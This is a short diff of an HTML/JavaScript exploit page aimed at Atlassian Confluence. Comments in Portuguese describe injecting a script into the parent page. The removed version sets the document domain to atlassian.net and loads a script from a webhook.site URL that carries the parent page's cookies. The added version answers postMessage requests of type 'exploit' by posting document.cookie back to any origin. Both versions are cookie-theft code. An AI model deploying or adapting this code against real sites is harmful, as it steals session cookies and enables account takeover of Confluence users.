@@ -1,13 +1,11 @@
-<!DOCTYPE html>
-<html>
-<body>
-  <script>
-    document.domain = 'atlassian.net';
-    
-    // Injetar script no Confluence (parent) que faz o request
-    var script = window.parent.document.createElement('script');
-    script.src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?callback=alert&cookies=' + encodeURIComponent(window.parent.document.cookie);
-    window.parent.document.head.appendChild(script);
-  </script>
-</body>
-</html>
+<script>
+window.addEventListener('message', function(e) {
+  if (e.data && e.data.type === 'exploit') {
+    // Tentar acessar parent agora via postMessage response
+    e.source.postMessage({
+      type: 'response',
+      cookie: document.cookie
+    }, '*');
+  }
+});
+</script>
